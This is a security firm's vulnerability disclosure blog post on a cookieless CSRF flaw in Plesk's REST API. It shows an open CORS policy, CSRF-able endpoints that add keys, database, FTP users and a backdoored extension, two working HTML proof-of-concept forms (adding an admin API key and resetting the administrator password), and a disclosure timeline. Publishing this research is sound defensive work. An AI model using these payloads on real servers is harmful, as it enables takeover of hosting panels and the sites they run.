=== Content from fortbridge.co.uk_ff13ce67_20250115_100943.html ===


[Skip to content](#content)
## Main Navigation

[![Cyber Security Services ‚Äì London](data:image/svg+xml...)![Cyber Security Services ‚Äì London](https://fortbridge.co.uk/wp-content/uploads/2020/11/fortbridge-logo.svg)](https://fortbridge.co.uk/)

* [About Us](https://fortbridge.co.uk/about/ "About Us")
* Services
  + [Mobile Application pentesting](https://fortbridge.co.uk/mobile-application-pentesting/ "Mobile Application pentesting")
  + [Web Application Pentesting](https://fortbridge.co.uk/web-application-pen-testing/ "Web Application Pentesting")
  + [Cloud Security Assessment Review](https://fortbridge.co.uk/cloud-security-assessment-review/ "Cloud Security Assessment Review")
  + [Red Teaming](https://fortbridge.co.uk/red-teaming/ "Red Teaming")
  + [Cloud security Architecture Assessment](https://fortbridge.co.uk/cloud-security-architecture-assessment/ "Cloud security Architecture Assessment")
  + [API Pentesting](https://fortbridge.co.uk/api-pentesting/ "API Pentesting")
  + [Network Pentesting](https://fortbridge.co.uk/network-pentesting/ "Network Pentesting")
  + [Security Architecture](https://fortbridge.co.uk/security-architecture/ "Security Architecture")
  + [Phishing](https://fortbridge.co.uk/phishing/ "Phishing")
* [Testimonials](https://fortbridge.co.uk/testimonials/ "Testimonials")
* [Blog](https://fortbridge.co.uk/blog/ "Blog")
* [Contact](https://fortbridge.co.uk/contact/ "Contact")

Search

### Categories

* [accreditations](https://fortbridge.co.uk/category/accreditations/) (3)
* [Exams](https://fortbridge.co.uk/category/exams/) (2)
* [pentesting](https://fortbridge.co.uk/category/pentesting/) (3)
* [Regulations](https://fortbridge.co.uk/category/regulations/) (7)
* [Research](https://fortbridge.co.uk/category/research/) (16)

# Compromising Plesk via its REST API

Posted on [9 November 2022 (10 November 2022)](https://fortbridge.co.uk/research/compromising-plesk-via-its-rest-api/)  by [Adrian Tiron](https://fortbridge.co.uk/author/adrian/)

![Plesk Dashboard](data:image/svg+xml...)![Plesk Dashboard](https://fortbridge.co.uk/wp-content/uploads/2022/05/developers_title2-1024x626.png)

Plesk Dashboard

## INTRO

Plesk is a commercial web hosting and server data center automation software developed for Linux and Windows-based retail hosting service providers. It‚Äôs the main choice of web hosting providers these days being used by 86.7% of the websites that use a web panel for administration. This is 4.4% of all websites and there around 2M Plesk installations in the US alone. As expected there are many interesting features to attack as an administrator, however we couldn‚Äôt find anything really exploitable and also it isn‚Äôt that interesting to begin with, if you‚Äôre already an administrator, right? We tried to see if we can escalate our privileges from one of the limited roles, but these seem solid. In the end we discovered a cookieless CSRF, which is basically a design issue in this case, because it affects all the POST requests and we could abuse most of the APIs with it.

Generally speaking, it‚Äôs obvious that Plesk has been through quite a few pentests and overall has a good security posture. The last thing we wanted to focus our attention on was the REST API. We were wondering, has the REST API the same level of security as the other Plesk components? Also we need to mention that the source code Plesk is highly obfuscated with a custom PHP extension.

## Misconfigured CORS policy

While reviewing the REST API, we quickly noticed that there was a completely open CORS policy:

[![Using a wildcard to allow everything](data:image/svg+xml...)![Using a wildcard to allow everything](https://fortbridge.co.uk/wp-content/uploads/2022/05/CORS-1024x833.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/CORS.png)

Using a wildcard to allow everything

So, we thought, wow this is definitely a good sign and we were on the right track testing the REST API. This will basically allow us to send any request with any methods/headers from any origin and read the response back. Or so we thought.

## Cookieless CSRF #1 ‚Äì add secret token

The administrator can call the REST APIs from the browser and there‚Äôs no CSRF protection either (partially correct as you will see next). Let‚Äôs try to CSRF an Administrator then. But what API endpoint shall we target? After reviewing the REST API, we discovered that there is the /api/v2/auth/keys endpoint which we thought of abusing by adding a secret key to give us admin access.

[![API endpoint to add a secret key for Administrator](data:image/svg+xml...)![API endpoint to add a secret key for Administrator](https://fortbridge.co.uk/wp-content/uploads/2022/05/the_add_key_api_ui-1024x938.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/the_add_key_api_ui.png)

API endpoint to add a secret key for Administrator

This key will allow us to authenticate and call any endpoints after that, no more CSRF needed üôÇ Perform CSRF once, add a backdoor token and get full access forever. Sweet, let‚Äôs try this.

[![Compromising  Plesk by CSRF  - first attempt failed](data:image/svg+xml...)![Compromising  Plesk by CSRF  - first attempt failed](https://fortbridge.co.uk/wp-content/uploads/2022/05/oh_no_malformed_json-1024x719.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/oh_no_malformed_json.png)

CSRF first attempt failed

We have used Burp‚Äôs CSRF POC generator and it seems that the request fails due to ‚Äú=‚Äù added at the end, the server can‚Äôt parse this JSON. This was no big issue, this old dog knows some old tricks and by reformatting our payload a bit we were able to generate a valid JSON.

[![Name field of the input will hold most of the JSON field](data:image/svg+xml...)![Name field of the input will hold most of the JSON field](https://fortbridge.co.uk/wp-content/uploads/2022/05/json_CSRF_POC_solution-1024x454.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/json_CSRF_POC_solution.png)

Name field of the input will hold most of the JSON field

The input‚Äôs name is html encoded and basically decodes to the following. The input‚Äôs value field will hold ‚Äòtest‚Äù}‚Äô so that when it‚Äôs concatenated with the name it will result in a valid JSON payload. Nothing new here.

[![Name field html decoded](data:image/svg+xml...)![Name field html decoded](https://fortbridge.co.uk/wp-content/uploads/2022/05/json_solution-1024x249.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/json_solution.png)

Name field html decoded

HTML POC looks like this:

```

<html>
  <!-- CSRF PoC -- FORTBRIDGE -- add a secret  key-->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VICTIMIP:8443/api/v2/auth/keys" method="POST" enctype="text/plain">
      <input type="hidden" name='&#123;&#10;&#32;&#32;&quot;ips&quot;&#58;&#32;&#91;&#10;&#32;&#32;&#32;&#32;&quot;86&#46;189&#46;139&#46;122&quot;&#10;&#32;&#32;&#93;&#44;&#10;&#32;&#32;&quot;login&quot;&#58;&#32;&quot;admin&quot;&#44;&#10;&#32;&#32;&quot;description&quot;&#58;&#32;&quot;' value='test"}' />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

Now we were able to create a valid CSRF payload and generate a secret key as you can see bellow. We also have a miconsfigured CORS policy, so we can steal it, right?

[![Compromising  Plesk by CSRF  - add new secret token](data:image/svg+xml...)![Compromising  Plesk by CSRF  - add new secret token](https://fortbridge.co.uk/wp-content/uploads/2022/05/getting_the_keyD-1024x468.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/getting_the_keyD.png)

CSRF attack on the Administrator

Well, not really. What we‚Äôve missed initially is that the Authorization header gets added automatically by the browser when using an html form to perform the CSRF attack using the POST method. However, when using the javascript XHR object to create the same request and get the token from the response, the Authorization header isn‚Äôt added anymore. Bummer, our CSRF fails in this case as we can‚Äôt read the key! But wait, there‚Äôs still some hope left. Maybe we can find some other REST endpoints where we can trigger a CSRF attack using HTML forms (POST based) that will be impactful enough to give an attacker what they need without reading the response. And we sure found quite a few of these endpoints that we‚Äôve exploited with various degree of severity as you‚Äôll see next.

## Cookieless CSRF #2 ‚Äì add DB user

We found a REST endpoint that allows us to add a db user which can connect from ANY remote host to ANY database.

[![Compromising  Plesk by CSRF Add DB user request](data:image/svg+xml...)![Compromising  Plesk by CSRF Add DB user request](https://fortbridge.co.uk/wp-content/uploads/2022/05/add_-new_db_user-1024x499.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/add_-new_db_user.png)

Add DB user (CSRF-able)

Result looks like bellow:

[![Compromising  Plesk by CSRF - DB user added](data:image/svg+xml...)![Compromising  Plesk by CSRF - DB user added](https://fortbridge.co.uk/wp-content/uploads/2022/05/added_dbuser_anyhost-1024x575.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/added_dbuser_anyhost.png)

DB user added

We thought of injecting an UDF for a quick RCE, however the mysql port is not accessible. Lesson learned, check the port first.

[![Mysql port filtered](data:image/svg+xml...)![Mysql port filtered](https://fortbridge.co.uk/wp-content/uploads/2022/05/mysql_port_filtered-1024x433.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/mysql_port_filtered.png)

Mysql port filtered

## Cookieless CSRF #3 ‚Äì add FTP user

We managed to add a new FTP user with access to any existing domain we wanted.

[![Compromising Plesk by CSRF - Adding a new FTP user ](data:image/svg+xml...)![Compromising Plesk by CSRF - Adding a new FTP user ](https://fortbridge.co.uk/wp-content/uploads/2022/05/add_ftp_user_burp-1024x475.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/add_ftp_user_burp.png)

Add FTP user (CSRF-able)

This actually worked, you can connect via FTP, inspect the client‚Äôs home dir and conduct further attacks from there.

[![Compromising Plesk by CSRF -  FTP connect OK](data:image/svg+xml...)![Compromising Plesk by CSRF -  FTP connect OK](https://fortbridge.co.uk/wp-content/uploads/2022/05/connected_to_ftp_OK-1024x442.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/connected_to_ftp_OK.png)

FTP connect OK

## Cookieless CSRF #3 ‚Äì add a malicious Plesk extension

We didn‚Äôt know what Plesk extensions were initially, so we did some quick research, backdoored an existing one and added it via CSRF upload using the REST API

[![Compromising Plesk by CSRF - malicious extension added via CSRF in the REST API](data:image/svg+xml...)![Compromising Plesk by CSRF - malicious extension added via CSRF in the REST API](https://fortbridge.co.uk/wp-content/uploads/2022/05/rce_via_extension_upload-1024x86.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/rce_via_extension_upload.png)

Plesk malicious extension added via CSRF in the REST API

The problem was that you still need to authenticate in Plesk to access the backdoored extension. Certainly there must be an easier way, right?

## Cookieless CSRF #4 ‚Äì compromise the admin

Plesk implements some custom commands internally (a ‚Äúcommand‚Äù is an abrastraction layer if you will in the code which calls various cli tools to do the heavy lifting) in order to manage the server as you can see bellow. One of these, is the ‚Äúadmin‚Äù command that allows you to do multiple things, including changing the Administrator‚Äôs password.

[![Compromising Plesk by CSRF - custom commands callable via REST API](data:image/svg+xml...)![Compromising Plesk by CSRF - custom commands callable via REST API](https://fortbridge.co.uk/wp-content/uploads/2022/05/get_commands_with_key-1024x874.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/get_commands_with_key.png)

Plesk custom commands callable via REST API

And that is exactly what we needed. We ended up compromising Plesk via its REST API (CSRF) and change the Admin‚Äôs password. Game over!

[![Compromising Plesk by CSRF - resetting the Administrator's password.](data:image/svg+xml...)![Compromising Plesk by CSRF - resetting the Administrator's password.](https://fortbridge.co.uk/wp-content/uploads/2022/05/changepass2-1024x447.png)](https://fortbridge.co.uk/wp-content/uploads/2022/05/changepass2.png)

CSRF-ing the Administrator to change his password.

HTML POC used to trigger the above request:

```
<html>
  <!-- CSRF PoC - FORTBRIDGE -  change admin password -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VICTIMIP:8443/api/v2/cli/admin/call" method="POST" enctype="text/plain">
      <input type="hidden" name='&#123;&#10;&#9;&quot;params&quot;&#58;&#32;&#91;&#32;&quot;&#45;&#45;set&#45;admin&#45;password&quot;&#44;&quot;&#45;passwd&quot;&#32;&#44;&quot;' value='F0rTBr1DG3&#33;&#64;&#35;&quot;&#93;&#10;&#125;' />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

The documentation around this feature isn‚Äôt great so it took a while to figure out the above payload. All POST requests can be CSRF-ed , because the browser adds the Authorization header automatically when using html forms. We noticed that there is a common misconception that an application using the Authorization header is protected against CSRF. As long as you don‚Äôt have to read the response back using javascript everything just works.

## Timeline

10/05/22 FORTBRIDGE reaches out to PLESK for vuln disclosure

11/05/22 Plesk confirms receipt and starts investigation

19/05/22 Plesk confirms the vulnerability and starts working on a fix, no ETA offered

03/06/22 Plesk fixes the issue, but requests *delaying* the disclosure, FORTBRIDGE accepts

25/07/22 FORTBRIDGE requests update on the patching progress

27/07/22 Plesk requests *delaying* the disclosure again, FORTBRIDGE accepts

03/08/22 Plesk estimates ‚Äúno longer than 2 weeks‚Äù for disclosure

16/09/22 FORTBRIDGE requests update

16/09/22 Plesk requests *delaying* the disclosure, FORTBRIDGE agrees to delay 2 months max

08/11/22 FORTBRIDGE releases blogpost with technical details of the Plesk Admin takeover issue

10/11/22 blog post updated with Plesk Call to Action

## References

<https://support.plesk.com/hc/en-us/articles/8497233114514> Plesk Call to Action

[RCE & Privesc in cPanel/WHM](https://fortbridge.co.uk/research/multiple-vulnerabilities-in-cpanel-whm/)

[Mass account takeover in Yunmai smartscale by abusing the REST API](https://fortbridge.co.uk/research/mass-account-takeover-yunmai/)

 [CSRF POCs sent to Plesk](https://github.com/fortbridge/Plesk)

### About Post Author

[![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/88982ee8fcceda9ff1e14c331416a5f0?s=150&d=mm&r=g)](https://fortbridge.co.uk/author/adrian/)

#### [Adrian Tiron](https://fortbridge.co.uk/author/adrian/)

Cloud Application Security Consultant

OSCP/CRTO/CRTL/AWS/Azure/DevSecOps

[See author's posts](https://fortbridge.co.uk/author/adrian/)

Share this...

* Email
* [Facebook](https://www.facebook.com/sharer.php?t=Compromising Plesk via its REST API&u=https://fortbridge.co.uk/research/compromising-plesk-via-its-rest-api/)
* [Twitter](https://twitter.com/intent/tweet?text=Compromising Plesk via its REST API&url=https://fortbridge.co.uk/research/compromising-plesk-via-its-rest-api/&via=)
* [Linkedin](https://www.linkedin.com/shareArticle?title=Compromising Plesk via its REST API&url=https://fortbridge.co.uk/research/compromising-plesk-via-its-rest-api/)
* [Whatsapp](https://web.whatsapp.com/send?text=https://fortbridge.co.uk/research/compromising-plesk-via-its-rest-api/)
* [Telegram](https://t.me/share/url?url=https://fortbridge.co.uk/research/compromising-plesk-via-its-rest-api/&text=Compromising Plesk via its REST API&to=)
* [Pinterest](https://pinterest.com/pin/create/button/?description=Compromising Plesk via its REST API&media=&url=https://fortbridge.co.uk/research/compromising-plesk-via-its-rest-api/)

Posted in [Research](https://fortbridge.co.uk/category/research/)Tagged [CORS-vulnerability](https://fortbridge.co.uk/tag/cors-vulnerability/), [csrf](https://fortbridge.co.uk/tag/csrf/), [json-csrf](https://fortbridge.co.uk/tag/json-csrf/)

## Post navigation

[A CSRF vulnerability in the popular csurf package](https://fortbridge.co.uk/research/a-csrf-vulnerability-in-the-popular-csurf-package/)[FORTBRIDGE RECEIVES DESC ACCREDITATION FOR PENETRATION TESTING](https://fortbridge.co.uk/accreditations/fortbridge-receives-desc-accreditation-for-penetration-testing/)

![FORTBRIDGE footer map](data:image/svg+xml...)![FORTBRIDGE footer map](https://fortbridge.co.uk/wp-content/uploads/2020/11/fortbridge-footer-map-bkg-03-min.png)

#### CONTACT US

contact@fortbridge.co.uk

#### ADDRESS

Brick Kiln Two,
Station Road, London,
SE13 5FR

#### LINKS

[Terms of Use](https://fortbridge.co.uk/terms/)

[Privacy Policy](https://fortbridge.co.uk/privacy-policy/)

[Acceptable use policy](https://fortbridge.co.uk/acceptable-use-policy/)

[Cookie policy](https://fortbridge.co.uk/cookie-policy/)

#### COMPANY

[About us](https://fortbridge.co.uk/about/)
[Services](https://fortbridge.co.uk/services/)
[Testimonials](https://fortbridge.co.uk/testimonials/)

[Contact](https://fortbridge.co.uk/contact/)

#### RESOURCE CENTER

[Blog](https://fortbridge.co.uk/blog/)
[RSS](https://fortbridge.co.uk/feed/)

#### SOCIAL MEDIA

Copyright FORTBRIDGE 2024


